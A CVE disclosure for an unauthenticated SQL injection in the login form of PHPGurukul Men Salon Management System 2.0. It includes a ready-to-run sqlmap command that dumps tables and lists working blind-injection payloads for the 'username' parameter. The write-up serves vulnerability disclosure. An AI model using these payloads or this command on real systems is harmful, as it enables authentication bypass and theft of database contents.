# CVE-2024-35511-PHPGurukul-Men-Salon-Management-System-2.0-SQL-Injection-Vulnerability (Unauthenticated)
+ Exploit Author: efekaanakkar
# Vendor Homepage
+ https://phpgurukul.com/men-salon-management-system-using-php-and-mysql
# Software Link
+ https://phpgurukul.com/?sdm_process_download=1&download_id=14066
# Overview
+ PHPGurukul Men Salon Management System V2.0 is susceptible to a A notable security weakness stems from inadequate safeguarding of the 'Username' parameter within the admin/index.php file. This vulnerability has the potential to be exploited for injecting harmful SQL queries, resulting in unauthorized access and extraction of confidential data from the database.
# Vulnerability Details
+ CVE ID: CVE-2024-35511
+ Affected Version: PHPGurukul Men Salon Management System 2.0 
+ Parameter Name: username
# References
+ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-35511
# Description
+ Inadequate validation and sanitization of the 'username' parameter pave the way for attackers to construct SQL injection queries, circumventing authentication measures and obtaining unauthorized entry to the database.
# Proof of Concept (PoC) : 
+ `sqlmap -u "http://localhost/msms/admin/index.php" --method POST --data="username=admin&password=admin&login=Sign+In" -p"username" --random-agent --level 3 --risk 3 --dump --tables`

```
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: username=admin' AND 4382=(SELECT (CASE WHEN (4382=4382) THEN 4382 ELSE (SELECT 5608 UNION SELECT 7404) END))-- zkRp&password=admin&login=Sign In

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 3172 FROM (SELECT(SLEEP(5)))sbzt)-- ljdG&password=admin&login=Sign In
---

```
+ current database: `msmsdb`
![Database](https://github.com/efekaanakkar/CVE/assets/130908672/9e7866fb-ae0a-4162-8e6f-141b25c91e96)

